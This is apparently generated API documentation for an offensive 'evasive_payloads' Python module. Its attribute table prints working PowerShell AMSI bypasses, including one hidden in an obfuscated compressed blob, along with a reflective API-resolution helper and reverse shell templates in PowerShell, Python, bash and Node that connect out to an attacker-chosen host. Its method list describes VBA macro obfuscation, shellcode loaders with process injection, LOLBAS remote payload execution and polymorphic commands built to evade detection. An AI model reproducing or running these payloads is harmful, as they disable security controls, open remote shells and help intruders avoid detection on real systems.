# `modules.evasive_payloads`

> Source: [modules/evasive_payloads.py:1](../../modules/evasive_payloads.py#L1) | language `py` | coverage 90.9% | [API index](../index.md)

Advanced evasive payload generation with multiple obfuscation strategies.

Provides polymorphic payload generation that mutates on each invocation,
making signature-based detection ineffective. Supports PowerShell
AMSI bypass, JavaScript obfuscation, shellcode encoding chains,
process injection variants, and LOLBAS execution paths.

## Contents

- **Classes:** [`EvasivePayloadGenerator`](#evasivepayloadgenerator)

## Classes

<a id="evasivepayloadgenerator"></a>

### `EvasivePayloadGenerator`

`class` | [modules/evasive_payloads.py:18](../../modules/evasive_payloads.py#L18)

```python
class EvasivePayloadGenerator
```

Generates detection-evading payloads with configurable obfuscation layers.

**Attributes**

| Name | Type | Default | Description |
|---|---|---|---|
| [`AMSI_BYPASS_TEMPLATES`](#evasivepayloadgenerator-amsi_bypass_templates) |  | `['[Ref].Assembly.GetType("System.Management.Automation.AmsiUtils").GetField("amsiInitFailed","NonPublic,Static").SetValue($null,$true)', '$a=[Ref].Assembly.GetTypes();Foreach($b in $a) {if ($b.Name -like "*iUtils") {$c=$b}};$d=$c.GetFields("NonPublic,Static");Foreach($e in $d) {if ($e.Name -like "*Context") {$f=$e}};$g=$f.GetValue($null);[IntPtr]$ptr=$g;[Int32[]]$buf=@(0);[System.Runtime.InteropServices.Marshal]::Copy($buf,0,$ptr,1)', '$x=[Ref].Assembly.GetType("System.Management.Automation.Am"+"siUtils");$y=$x.GetField("am"+"siInitFailed","NonPublic,Static");$y.SetValue($null,$true)', '&( $SHELLiD[1]+$SHELlID[13]+"x") (NeW-oBJeCT io.COMpReSsIoN.dEFlAtestrEaM( [iO.meMOrYstREAM] [cOnveRT]::frOmBase64STRiNg( "rVHBioMwFPwAYyBXL1LwIpRSEQ9FhL2IlfoJwTyzwTQxiXH791VotxV6KAzMG2bezFBwBQHw2TjEOrxm7DxqVYk4dA8Fs9R31o3oU7jRFt3Ye2o+Bp++YlPeTaViXc2sMQuVdYni5I+W9LOi06Jdpo0op1NPa/9H9pEir+c0LlOAcDuf/zDIO0fy6wa7SqBVmjyRr6dDm6rN4nI8/gA=" ) , [SYsTEm.iO.compReSsioN.COmPreSsiONmoDE]::DeCOMPreSs )\|%{ & $EnV:CmD /c ASSEMbLY ( ( $PSHOME[1]+$pShOMe[29]+"x")( $_ ) ) }; # AMSI bypass via compressed assembly load']` |  |
| [`SYSLIB_BYPASS_TEMPLATES`](#evasivepayloadgenerator-syslib_bypass_templates) |  | `['function Get-ProcAddress {Param($m,$p);$a=@();$u=[AppDomain]::CurrentDomain.GetAssemblies();($u \|? {$_.GlobalAssemblyCache -And $_.Location.Split("\\\\")[-1].Equals("System.dll")}).GetType("Microsoft.Win32.UnsafeNativeMethods").GetMethod("GetProcAddress").Invoke($null,@([System.Runtime.InteropServices.HandleRef](New-Object System.Runtime.InteropServices.HandleRef((New-Object IntPtr),($u \|? {$_.GlobalAssemblyCache -And $_.Location.Split("\\\\")[-1].Equals("System.dll")}).GetType("Microsoft.Win32.UnsafeNativeMethods").GetMethod("GetModuleHandle").Invoke($null,@($m)))),$p))}function Get-DelegateType{[OutputType([Type])]Param([Type[]]$p,[Type]$r=([Void])];$d=[AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object System.Reflection.AssemblyName("ReflectedDelegate")),[System.Reflection.Emit.AssemblyBuilderAccess]::Run).DefineDynamicModule("InMemoryModule",$false).DefineType("MyDelegateType","Class, Public, Sealed, AnsiClass, AutoClass",[System.MulticastDelegate]);$d.DefineConstructor("RTSpecialName, HideBySig, Public",[System.Reflection.CallingConventions]::Standard,$p).SetImplementationFlags("Runtime, Managed");$d.DefineMethod("Invoke","Public, HideBySig, NewSlot, Virtual",$r,$p).SetImplementationFlags("Runtime, Managed");$d.CreateType()}']` |  |
| [`REVERSE_SHELL_TEMPLATES`](#evasivepayloadgenerator-reverse_shell_templates) | `dict[str, str]` | `{'powershell': "$c=New-Object System.Net.Sockets.TCPClient('{rhost}',{rport});$s=$c.GetStream();[byte[]]$b=0..65535\|%{{0}};$e=New-Object System.Text.ASCIIEncoding;while(($i=$s.Read($b,0,$b.Length)) -ne 0){{$d=$e.GetString($b,0,$i);$r=(iex $d 2>&1\|Out-String);$x=$e.GetBytes($r+''PS ''+(Get-Location).Path+''> '');$s.Write($x,0,$x.Length);$s.Flush()}};$c.Close()", 'python': "import socket,subprocess,os\ns=socket.socket(socket.AF_INET,socket.SOCK_STREAM)\ns.connect(('{rhost}',{rport}))\nos.dup2(s.fileno(),0)\nos.dup2(s.fileno(),1)\nos.dup2(s.fileno(),2)\nsubprocess.call(['/bin/sh','-i'])", 'bash': 'bash -i >& /dev/tcp/{rhost}/{rport} 0>&1', 'node': "(function(){{var n=require('net'),s=require('child_process').spawn('sh');var c=new n.Socket();c.connect({rport},'{rhost}',function(){{c.pipe(s.stdin);s.stdout.pipe(c);s.stderr.pipe(c);}});return /a/;}})();"}` |  |
| [`ENCODING_CHAINS`](#evasivepayloadgenerator-encoding_chains) |  | `[['base64'], ['base64', 'gzip'], ['xor', 'base64'], ['base64', 'xor', 'base64'], ['gzip', 'base64', 'rot13'], ['xor', 'gzip', 'base64']]` |  |
| [`EVASION_TECHNIQUES`](#evasivepayloadgenerator-evasion_techniques) |  | `['sleep_obfuscation', 'syscall_direct', 'unhooking', 'indirect_syscall', 'api_hashing', 'process_hollowing', 'early_bird_apc', 'thread_hijacking', 'module_stomping', 'phantom_dll_hollowing']` |  |

**Members**

| Member | Kind | Summary |
|---|---|---|
| [`__init__`](#evasivepayloadgenerator-__init__) | constructor |  |
| [`generate_powershell_obfuscated`](#evasivepayloadgenerator-generate_powershell_obfuscated) | method | Generate an obfuscated PowerShell payload. |
| [`generate_javascript_obfuscated`](#evasivepayloadgenerator-generate_javascript_obfuscated) | method | Generate an obfuscated JavaScript payload. |
| [`generate_vba_obfuscated`](#evasivepayloadgenerator-generate_vba_obfuscated) | method | Generate an obfuscated VBA macro payload. |
| [`generate_linux_evasive`](#evasivepayloadgenerator-generate_linux_evasive) | method | Generate an evasive Linux reverse shell payload. |
| [`generate_shellcode_loader_powershell`](#evasivepayloadgenerator-generate_shellcode_loader_powershell) | method | Generate a PowerShell shellcode loader with AMSI bypass. |
| [`generate_lolbas_execution`](#evasivepayloadgenerator-generate_lolbas_execution) | method | Generate a LOLBAS-based payload execution command. |
| [`generate_polymorphic_command`](#evasivepayloadgenerator-generate_polymorphic_command) | method | Generate a polymorphic command that mutates at each execution. |
| [`list_techniques`](#evasivepayloadgenerator-list_techniques) | method | Return all available evasion techniques. |

<a id="evasivepayloadgenerator-__init__"></a>

#### `EvasivePayloadGenerator.__init__`

`constructor` | [modules/evasive_payloads.py:84](../../modules/evasive_payloads.py#L84)

```python
def __init__(self) -> None
```

*Called by:* [`EvasivePayloadCommandSet.do_evasive`](cli.commands.evasive_payload.py.md#evasivepayloadcommandset-do_evasive)

<a id="evasivepayloadgenerator-generate_powershell_obfuscated"></a>

#### `EvasivePayloadGenerator.generate_powershell_obfuscated`

`method` | [modules/evasive_payloads.py:138](../../modules/evasive_payloads.py#L138)

```python
def generate_powershell_obfuscated(self, payload: str, obfuscation_level: int = 3) -> str
```

Generate an obfuscated PowerShell payload.

**Parameters**

| Name | Type | Default | Description |
|---|---|---|---|
| `payload` | `str` |  | The raw PowerShell command to obfuscate. |
| `obfuscation_level` | `int` | `3` | 1=minimal, 2=moderate, 3=heavy. |

**Returns:** `str` - A heavily obfuscated PowerShell one-liner.

*Called by:* [`EvasivePayloadCommandSet.do_evasive`](cli.commands.evasive_payload.py.md#evasivepayloadcommandset-do_evasive)

<a id="evasivepayloadgenerator-generate_javascript_obfuscated"></a>

#### `EvasivePayloadGenerator.generate_javascript_obfuscated`

`method` | [modules/evasive_payloads.py:178](../../modules/evasive_payloads.py#L178)

```python
def generate_javascript_obfuscated(self, payload: str) -> str
```

Generate an obfuscated JavaScript payload.

**Parameters**

| Name | Type | Default | Description |
|---|---|---|---|
| `payload` | `str` |  | Raw JavaScript to obfuscate. |

**Returns:** `str` - Obfuscated JavaScript using eval with char code reconstruction.

*Called by:* [`EvasivePayloadCommandSet.do_evasive`](cli.commands.evasive_payload.py.md#evasivepayloadcommandset-do_evasive)

<a id="evasivepayloadgenerator-generate_vba_obfuscated"></a>

#### `EvasivePayloadGenerator.generate_vba_obfuscated`

`method` | [modules/evasive_payloads.py:197](../../modules/evasive_payloads.py#L197)

```python
def generate_vba_obfuscated(self, payload: str) -> str
```

Generate an obfuscated VBA macro payload.

**Parameters**

| Name | Type | Default | Description |
|---|---|---|---|
| `payload` | `str` |  | Raw VBA code to obfuscate. |

**Returns:** `str` - Obfuscated VBA using Chr() function reconstruction.

*Called by:* [`EvasivePayloadCommandSet.do_evasive`](cli.commands.evasive_payload.py.md#evasivepayloadcommandset-do_evasive)

<a id="evasivepayloadgenerator-generate_linux_evasive"></a>

#### `EvasivePayloadGenerator.generate_linux_evasive`

`method` | [modules/evasive_payloads.py:214](../../modules/evasive_payloads.py#L214)

```python
def generate_linux_evasive(self, rhost: str, rport: int, technique: str = 'python') -> str
```

Generate an evasive Linux reverse shell payload.

**Parameters**

| Name | Type | Default | Description |
|---|---|---|---|
| `rhost` | `str` |  | Remote host IP. |
| `rport` | `int` |  | Remote port. |
| `technique` | `str` | `'python'` | Shell type (python, bash, or node). |

**Returns:** `str` - Base64-encoded evasive payload ready for execution.

*Called by:* [`EvasivePayloadCommandSet.do_evasive`](cli.commands.evasive_payload.py.md#evasivepayloadcommandset-do_evasive)

<a id="evasivepayloadgenerator-generate_shellcode_loader_powershell"></a>

#### `EvasivePayloadGenerator.generate_shellcode_loader_powershell`

`method` | [modules/evasive_payloads.py:239](../../modules/evasive_payloads.py#L239)

```python
def generate_shellcode_loader_powershell(self, shellcode_b64: str, injection_technique: str = 'early_bird_apc') -> str
```

Generate a PowerShell shellcode loader with AMSI bypass.

**Parameters**

| Name | Type | Default | Description |
|---|---|---|---|
| `shellcode_b64` | `str` |  | Base64-encoded shellcode. |
| `injection_technique` | `str` | `'early_bird_apc'` | Process injection technique to embed. |

**Returns:** `str` - Complete obfuscated PowerShell loader.

*Called by:* [`EvasivePayloadCommandSet.do_evasive`](cli.commands.evasive_payload.py.md#evasivepayloadcommandset-do_evasive)

<a id="evasivepayloadgenerator-generate_lolbas_execution"></a>

#### `EvasivePayloadGenerator.generate_lolbas_execution`

`method` | [modules/evasive_payloads.py:284](../../modules/evasive_payloads.py#L284)

```python
def generate_lolbas_execution(self, payload_url: str, technique: str = 'mshta') -> tuple[str, str]
```

Generate a LOLBAS-based payload execution command.

Uses legitimate Windows binaries for execution to bypass
application allowlisting.

**Parameters**

| Name | Type | Default | Description |
|---|---|---|---|
| `payload_url` | `str` |  | URL hosting the payload. |
| `technique` | `str` | `'mshta'` | LOLBAS binary to use. |

**Returns:** `tuple[str, str]` - Tuple of (command, description).

*Called by:* [`EvasivePayloadCommandSet.do_evasive`](cli.commands.evasive_payload.py.md#evasivepayloadcommandset-do_evasive)

<a id="evasivepayloadgenerator-generate_polymorphic_command"></a>

#### `EvasivePayloadGenerator.generate_polymorphic_command`

`method` | [modules/evasive_payloads.py:334](../../modules/evasive_payloads.py#L334)

```python
def generate_polymorphic_command(self, base_cmd: str, iterations: int = 5) -> str
```

Generate a polymorphic command that mutates at each execution.

Inserts random no-op commands, variable renames, and padding
to defeat signature-based detection.

**Parameters**

| Name | Type | Default | Description |
|---|---|---|---|
| `base_cmd` | `str` |  | The base command to obfuscate. |
| `iterations` | `int` | `5` | Number of obfuscation passes. |

**Returns:** `str` - A polymorphic command that produces the same effect.

*Called by:* [`EvasivePayloadCommandSet.do_evasive`](cli.commands.evasive_payload.py.md#evasivepayloadcommandset-do_evasive)

<a id="evasivepayloadgenerator-list_techniques"></a>

#### `EvasivePayloadGenerator.list_techniques`

`method` | [modules/evasive_payloads.py:374](../../modules/evasive_payloads.py#L374)

```python
def list_techniques(self) -> dict[str, list[str]]
```

Return all available evasion techniques.

**Returns:** `dict[str, list[str]]`

*Called by:* [`EvasivePayloadCommandSet.do_evasive`](cli.commands.evasive_payload.py.md#evasivepayloadcommandset-do_evasive)

---
